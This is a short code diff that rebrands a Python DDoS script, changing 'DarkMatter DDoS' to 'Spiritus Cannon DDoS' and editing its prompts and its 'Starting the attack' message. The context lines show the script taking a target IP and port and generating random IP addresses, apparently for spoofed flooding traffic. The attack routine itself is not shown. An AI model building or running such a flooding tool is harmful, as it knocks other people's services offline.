@@ -3,8 +3,8 @@ import os, sys
 import time
 import multiprocessing, random
 
-print("Welcome To DarkMatter DDoS")
-ip = input("IP/Domain: ")
+print("Welcome To Spiritus Cannon DDoS")
+ip = input("IP Address: ")
 port = int(input("Port: "))
 
 url = "http://" + str(ip)
@@ -24,7 +24,7 @@ def randomip():
   randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
   return(randip)
 
-print("[>>>] Starting the attack [<<<]")
+print("[>>>] Starting the attack Cannon Sir! [<<<]")
 
 
 time.sleep(1)
